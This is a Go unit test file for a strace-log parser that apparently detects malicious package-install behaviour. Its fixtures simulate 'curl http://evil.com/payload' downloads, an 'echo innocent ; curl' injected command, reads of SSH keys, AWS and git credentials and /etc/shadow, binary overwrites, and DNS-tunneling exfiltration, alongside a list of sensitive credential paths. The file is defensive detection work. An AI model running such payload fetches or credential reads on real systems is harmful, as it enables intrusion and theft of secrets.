package probe

import (
	"testing"

	"github.com/RalianENG/kojuto/internal/types"
)

func TestParseStraceLine_Connect_IPv4(t *testing.T) {
	line := `[pid 12345] connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("93.184.216.34")}, 16) = -1 ENETUNREACH`

	evt, ok := parseStraceLine(line, NewParseState())
	if !ok {
		t.Fatal("expected parse to succeed")
	}

	if evt.Syscall != types.EventConnect {
		t.Errorf("expected syscall connect, got %s", evt.Syscall)
	}

	if evt.DstPort != 443 {
		t.Errorf("expected port 443, got %d", evt.DstPort)
	}

	if evt.DstAddr != "93.184.216.34" {
		t.Errorf("expected addr 93.184.216.34, got %s", evt.DstAddr)
	}

	if evt.PID != 12345 {
		t.Errorf("expected pid 12345, got %d", evt.PID)
	}
}

func TestParseStraceLine_Connect_IPv6(t *testing.T) {
	line := `[pid 999] connect(5, {sa_family=AF_INET6, sin6_port=htons(80), sin6_addr=inet6_addr("::1")}, 28) = 0`

	evt, ok := parseStraceLine(line, NewParseState())
	if !ok {
		t.Fatal("expected parse to succeed")
	}

	if evt.Family != 10 {
		t.Errorf("expected family 10 (AF_INET6), got %d", evt.Family)
	}
}

func TestParseStraceLine_Sendto(t *testing.T) {
	line := `[pid 500] sendto(4, "\0\0\1\0\0\1...", 29, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 29`

	evt, ok := parseStraceLine(line, NewParseState())
	if !ok {
		t.Fatal("expected sendto parse to succeed")
	}

	if evt.Syscall != types.EventSendto {
		t.Errorf("expected syscall sendto, got %s", evt.Syscall)
	}

	if evt.DstPort != 53 {
		t.Errorf("expected port 53, got %d", evt.DstPort)
	}

	if evt.DstAddr != "8.8.8.8" {
		t.Errorf("expected addr 8.8.8.8, got %s", evt.DstAddr)
	}
}

func TestParseStraceLine_Execve(t *testing.T) {
	line := `[pid 777] execve("/usr/bin/curl", ["curl", "http://evil.com/payload"], 0x...) = 0`

	evt, ok := parseStraceLine(line, NewParseState())
	if !ok {
		t.Fatal("expected execve parse to succeed")
	}

	if evt.Syscall != types.EventExecve {
		t.Errorf("expected syscall execve, got %s", evt.Syscall)
	}

	if evt.Comm != "/usr/bin/curl" {
		t.Errorf("expected comm /usr/bin/curl, got %s", evt.Comm)
	}

	if evt.Cmdline != "curl http://evil.com/payload" {
		t.Errorf("expected cmdline 'curl http://evil.com/payload', got %q", evt.Cmdline)
	}

	if evt.PID != 777 {
		t.Errorf("expected pid 777, got %d", evt.PID)
	}
}

func TestParseStraceLine_Irrelevant(t *testing.T) {
	lines := []string{
		"openat(AT_FDCWD, \"/etc/hosts\", O_RDONLY) = 3",                               // non-sensitive path
		"connect(3, {sa_family=AF_UNIX, sun_path=\"/var/run/nscd/socket\"}, 110) = -1", // AF_UNIX
		"",
		"some random text",
	}

	for _, line := range lines {
		if _, ok := parseStraceLine(line, NewParseState()); ok {
			t.Errorf("expected parse to fail for %q", line)
		}
	}
}

func TestParseStraceLine_ExecveFailedENOENT(t *testing.T) {
	// Failed execve (ENOENT) should be skipped — it's a normal PATH lookup.
	lines := []string{
		`[pid    33] execve("/usr/local/bin/curl", ["curl", "http://198.51.100.1/payload"], 0x7fff29c11690 /* 8 vars */) = -1 ENOENT (No such file or directory)`,
		`[pid    30] execve("/usr/local/bin/lsb_release", ["lsb_release", "-a"], 0x7ffdd868e370 /* 7 vars */) = -1 ENOENT (No such file or directory)`,
		`[pid    19] execve("/usr/sbin/curl", ["curl", "http://evil.com"], 0x7fff /* 8 vars */) = -1 EACCES (Permission denied)`,
	}

	for _, line := range lines {
		if _, ok := parseStraceLine(line, NewParseState()); ok {
			t.Errorf("expected failed execve to be skipped: %s", line)
		}
	}
}

func TestParseStraceLine_ExecveSuccess(t *testing.T) {
	// Successful execve (= 0) should be parsed.
	line := `[pid    34] execve("/bin/sh", ["sh", "-c", "--", "echo innocent ; curl http://198."], 0x7fff29c11690 /* 8 vars */) = 0`

	evt, ok := parseStraceLine(line, NewParseState())
	if !ok {
		t.Fatal("expected successful execve to be parsed")
	}

	if evt.Comm != "/bin/sh" {
		t.Errorf("expected comm /bin/sh, got %s", evt.Comm)
	}
}

func TestParseStraceLine_OpenatSensitive(t *testing.T) {
	cases := []struct {
		name      string
		line      string
		wantPath  string
		wantFlags string
	}{
		{
			name:      "SSH key read",
			line:      `[pid 100] openat(AT_FDCWD, "/home/dev/.ssh/id_rsa", O_RDONLY) = 3`,
			wantPath:  "/home/dev/.ssh/id_rsa",
			wantFlags: "O_RDONLY",
		},
		{
			name:      "AWS credentials",
			line:      `[pid 200] openat(AT_FDCWD, "/home/dev/.aws/credentials", O_RDONLY|O_CLOEXEC) = 4`,
			wantPath:  "/home/dev/.aws/credentials",
			wantFlags: "O_RDONLY|O_CLOEXEC",
		},
		{
			name:      "proc environ",
			line:      `[pid 300] openat(AT_FDCWD, "/proc/self/environ", O_RDONLY) = 5`,
			wantPath:  "/proc/self/environ",
			wantFlags: "O_RDONLY",
		},
		{
			name:      "etc shadow",
			line:      `openat(AT_FDCWD, "/etc/shadow", O_RDONLY) = -1 EACCES`,
			wantPath:  "/etc/shadow",
			wantFlags: "O_RDONLY",
		},
		{
			name:      "git-credentials",
			line:      `[pid 400] openat(AT_FDCWD, "/home/dev/.git-credentials", O_RDONLY) = 6`,
			wantPath:  "/home/dev/.git-credentials",
			wantFlags: "O_RDONLY",
		},
		{
			name:      "docker config",
			line:      `[pid 500] openat(3, "/home/dev/.docker/config.json", O_RDONLY|O_CLOEXEC) = 7`,
			wantPath:  "/home/dev/.docker/config.json",
			wantFlags: "O_RDONLY|O_CLOEXEC",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			evt, ok := parseStraceLine(tc.line, NewParseState())
			if !ok {
				t.Fatal("expected parse to succeed")
			}
			if evt.Syscall != types.EventOpenat {
				t.Errorf("expected openat, got %s", evt.Syscall)
			}
			if evt.FilePath != tc.wantPath {
				t.Errorf("expected path %s, got %s", tc.wantPath, evt.FilePath)
			}
			if evt.OpenFlags != tc.wantFlags {
				t.Errorf("expected flags %s, got %s", tc.wantFlags, evt.OpenFlags)
			}
		})
	}
}

func TestParseStraceLine_OpenatNonSensitive(t *testing.T) {
	// Non-sensitive paths should NOT produce events.
	lines := []string{
		`[pid 100] openat(AT_FDCWD, "/usr/lib/python3.12/os.py", O_RDONLY) = 3`,
		`[pid 200] openat(AT_FDCWD, "/etc/hosts", O_RDONLY) = 4`,
		`openat(AT_FDCWD, "/tmp/pip-install-xyz/setup.py", O_RDONLY) = 5`,
	}

	for _, line := range lines {
		if _, ok := parseStraceLine(line, NewParseState()); ok {
			t.Errorf("expected non-sensitive openat to be skipped: %s", line)
		}
	}
}

func TestParseStraceLine_Rename(t *testing.T) {
	cases := []struct {
		name    string
		line    string
		wantSrc string
		wantDst string
	}{
		{
			name:    "simple rename",
			line:    `[pid 100] rename("/tmp/evil", "/usr/local/bin/python3") = 0`,
			wantSrc: "/tmp/evil",
			wantDst: "/usr/local/bin/python3",
		},
		{
			name:    "renameat",
			line:    `[pid 200] renameat(AT_FDCWD, "/tmp/payload", AT_FDCWD, "/usr/bin/node") = 0`,
			wantSrc: "/tmp/payload",
			wantDst: "/usr/bin/node",
		},
		{
			name:    "renameat2",
			line:    `[pid 300] renameat2(5, "/tmp/x", 6, "/bin/sh", 0) = 0`,
			wantSrc: "/tmp/x",
			wantDst: "/bin/sh",
		},
		{
			name:    "rename to non-trusted dir",
			line:    `[pid 400] rename("/tmp/a", "/install/lib/module.so") = 0`,
			wantSrc: "/tmp/a",
			wantDst: "/install/lib/module.so",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			evt, ok := parseStraceLine(tc.line, NewParseState())
			if !ok {
				t.Fatal("expected parse to succeed")
			}
			if evt.Syscall != types.EventRename {
				t.Errorf("expected rename, got %s", evt.Syscall)
			}
			if evt.SrcPath != tc.wantSrc {
				t.Errorf("expected src %s, got %s", tc.wantSrc, evt.SrcPath)
			}
			if evt.DstPath != tc.wantDst {
				t.Errorf("expected dst %s, got %s", tc.wantDst, evt.DstPath)
			}
		})
	}
}

func TestIsSensitivePath(t *testing.T) {
	sensitive := []string{
		"/home/dev/.ssh/id_rsa",
		"/root/.gnupg/secring.gpg",
		"/home/user/.aws/credentials",
		"/etc/shadow",
		"/proc/self/environ",
		"/home/dev/.netrc",
		"/home/dev/.git-credentials",
		"/home/dev/.docker/config.json",
		"/home/dev/.config/gh/hosts.yml",
	}
	for _, p := range sensitive {
		if !isSensitivePath(p) {
			t.Errorf("expected %s to be sensitive", p)
		}
	}

	benign := []string{
		"/etc/hosts",
		"/usr/lib/python3.12/os.py",
		"/tmp/pip-install-xyz/setup.py",
		"/home/dev/.bashrc",
		"/home/dev/.npmrc",
	}
	for _, p := range benign {
		if isSensitivePath(p) {
			t.Errorf("expected %s to NOT be sensitive", p)
		}
	}
}

func TestExtractDNSQuery(t *testing.T) {
	cases := []struct {
		name string
		line string
		want string
	}{
		{
			name: "standard A query",
			line: `[pid 100] sendto(4, "\0\0\1\0\0\1\0\0\0\0\0\0\x06google\x03com\0\0\1\0\1", 28, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 28`,
			want: "google.com",
		},
		{
			name: "tunneling query",
			line: `[pid 200] sendto(4, "\0\0\x01\0\0\x01\0\0\0\0\0\0\x0faGVsbG8gd29ybGQ\x04evil\x03com\0\0\x01\0\x01", 42, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 42`,
			want: "aGVsbG8gd29ybGQ.evil.com",
		},
		{
			name: "no buffer match",
			line: `[pid 300] sendto(4, ..., 28, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 28`,
			want: "",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := extractDNSQuery(tc.line)
			if got != tc.want {
				t.Errorf("expected %q, got %q", tc.want, got)
			}
		})
	}
}

func TestParseDNSName(t *testing.T) {
	// \x06google\x03com\x00 → "google.com".
	data := []byte{6, 'g', 'o', 'o', 'g', 'l', 'e', 3, 'c', 'o', 'm', 0}
	if got := parseDNSName(data); got != "google.com" {
		t.Errorf("expected google.com, got %q", got)
	}

	// Empty.
	if got := parseDNSName([]byte{0}); got != "" {
		t.Errorf("expected empty, got %q", got)
	}
}

func TestUnescapeStraceBuf(t *testing.T) {
	// \x06google\x03com\0.
	input := `\x06google\x03com\0`
	got := unescapeStraceBuf(input)
	expected := []byte{6, 'g', 'o', 'o', 'g', 'l', 'e', 3, 'c', 'o', 'm', 0}
	if len(got) != len(expected) {
		t.Fatalf("length mismatch: got %d, want %d", len(got), len(expected))
	}
	for i := range expected {
		if got[i] != expected[i] {
			t.Errorf("byte %d: got %d, want %d", i, got[i], expected[i])
		}
	}

	// Tunneling payload: 15-char label + "evil" + "com".
	input2 := `\0\0\x01\0\0\x01\0\0\0\0\0\0\x0faGVsbG8gd29ybGQ\x04evil\x03com\0\0\x01\0\x01`
	got2 := unescapeStraceBuf(input2)
	// Byte 12 = 0x0f (15), bytes 13-27 = "aGVsbG8gd29ybGQ", byte 28 = 4.
	if len(got2) < 28 {
		t.Fatalf("tunneling unescape too short: %d bytes: %v", len(got2), got2)
	}
	if got2[12] != 15 {
		t.Errorf("label len at byte 12: got %d, want 15", got2[12])
	}
	if got2[28] != 4 {
		t.Errorf("label len at byte 28: got %d, want 4", got2[28])
	}

	// Alphabetic C escapes strace uses for specific control bytes.
	// \f is the case that broke DGA detection in live scans: a DNS
	// label length of 12 (0x0C) is rendered as `\f`, so if the
	// escape is dropped the label reader misaligns on the very
	// first length byte.
	alphaCases := []struct {
		name  string
		input string
		want  []byte
	}{
		{"form feed (\\f = 0x0C)", `\fabc`, []byte{0x0C, 'a', 'b', 'c'}},
		{"vertical tab (\\v = 0x0B)", `\vxy`, []byte{0x0B, 'x', 'y'}},
		{"alert (\\a = 0x07)", `\aXY`, []byte{0x07, 'X', 'Y'}},
		{"backspace (\\b = 0x08)", `\bZ`, []byte{0x08, 'Z'}},
		{"escaped quote (\\\") ", `\"hi`, []byte{'"', 'h', 'i'}},
		{"escaped apostrophe (\\')", `\'x`, []byte{'\'', 'x'}},
	}
	for _, tc := range alphaCases {
		t.Run(tc.name, func(t *testing.T) {
			got := unescapeStraceBuf(tc.input)
			if len(got) != len(tc.want) {
				t.Fatalf("length mismatch: got %d %v, want %d %v",
					len(got), got, len(tc.want), tc.want)
			}
			for i := range tc.want {
				if got[i] != tc.want[i] {
					t.Errorf("byte %d: got %d, want %d", i, got[i], tc.want[i])
				}
			}
		})
	}

	// End-to-end: d2_dga_low_entropy_multi's actual sendto line
	// (captured from a live scan). Without the \f handler the
	// parser dropped one byte on every DGA query and DNS name
	// extraction silently failed.
	dgaLine := `sendto(3, "\314\314\1\0\0\1\0\0\0\0\0\0\fnode-edge-01\7metrics\17legit-analytics\3com\0\0\1\0\1", 58, 0, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, 16) = 58`
	if got := extractDNSQuery(dgaLine); got != "node-edge-01.metrics.legit-analytics.com" {
		t.Errorf("d2-style DGA sendto: got %q, want node-edge-01.metrics.legit-analytics.com", got)
	}
}

// TestExtractDNSQueryFromMsg pins the sendmsg / sendmmsg DNS
// extraction path. sendto had DNS extraction; sendmsg / sendmmsg
// were previously silent because their buffer lives inside a
// msg_iov entry (`iov_base="..."`) rather than as a direct argument.
// Attacker code that constructs raw DNS packets via sendmsg to
// avoid the more-inspected sendto path would have escaped detection.
func TestExtractDNSQueryFromMsg(t *testing.T) {
	cases := []struct {
		name string
		line string
		want string
	}{
		{
			name: "sendmsg with iov_base carrying DNS",
			line: `sendmsg(3, {msg_name={sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, msg_namelen=16, msg_iov=[{iov_base="\0\0\1\0\0\1\0\0\0\0\0\0\x06google\x03com\0\0\1\0\1", iov_len=28}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, 0) = 28`,
			want: "google.com",
		},
		{
			name: "sendmmsg with iov_base inside msg_hdr",
			line: `sendmmsg(3, [{msg_hdr={msg_name={sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, msg_iov=[{iov_base="\0\0\1\0\0\1\0\0\0\0\0\0\x04test\x03com\0\0\1\0\1", iov_len=26}], msg_iovlen=1}, msg_len=26}], 1, 0) = 1`,
			want: "test.com",
		},
		{
			name: "sendmsg with buffer that has \\f label length (\"node-edge-01\" is 12 chars)",
			line: `sendmsg(3, {msg_name={sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, msg_namelen=16, msg_iov=[{iov_base="\314\314\1\0\0\1\0\0\0\0\0\0\fnode-edge-01\7metrics\17legit-analytics\3com\0\0\1\0\1", iov_len=58}], msg_iovlen=1}, 0) = 58`,
			want: "node-edge-01.metrics.legit-analytics.com",
		},
		{
			name: "no iov_base present (regex miss)",
			line: `sendmsg(3, {msg_name={sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, ..., msg_flags=0}, 0) = 28`,
			want: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := extractDNSQueryFromMsg(tc.line)
			if got != tc.want {
				t.Errorf("got %q, want %q", got, tc.want)
			}
		})
	}
}

// TestParseStraceLine_SendmsgDNS wires the parseStraceLine dispatch
// end-to-end: a sendmsg to port 53 populates DNSQuery from the
// iov_base buffer, so downstream analyzer rules (isDNSTunnel,
// matchExfilService, DGA clustering, DNS chain annotation) all see
// the queried hostname.
func TestParseStraceLine_SendmsgDNS(t *testing.T) {
	line := `[pid 400] sendmsg(3, {msg_name={sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr("8.8.8.8")}, msg_namelen=16, msg_iov=[{iov_base="\0\0\1\0\0\1\0\0\0\0\0\0\x06google\x03com\0\0\1\0\1", iov_len=28}], msg_iovlen=1, msg_controllen=0, msg_flags=0}, 0) = 28`
	evt, ok := parseStraceLine(line, NewParseState())
	if !ok {
		t.Fatal("parseStraceLine should recognise the sendmsg")
	}
	if evt.Syscall != types.EventSendmsg {
		t.Errorf("Syscall = %q, want sendmsg", evt.Syscall)
	}
	if evt.DstPort != 53 {
		t.Errorf("DstPort = %d, want 53", evt.DstPort)
	}
	if evt.DNSQuery != "google.com" {
		t.Errorf("DNSQuery = %q, want google.com", evt.DNSQuery)
	}
}

func TestParseStraceLine_NoPID(t *testing.T) {
	line := `connect(3, {sa_family=AF_INET, sin_port=htons(8080), sin_addr=inet_addr("127.0.0.1")}, 16) = 0`

	evt, ok := parseStraceLine(line, NewParseState())
	if !ok {
		t.Fatal("expected parse to succeed")
	}

	if evt.PID != 0 {
		t.Errorf("expected pid 0 (no pid prefix), got %d", evt.PID)
	}
}
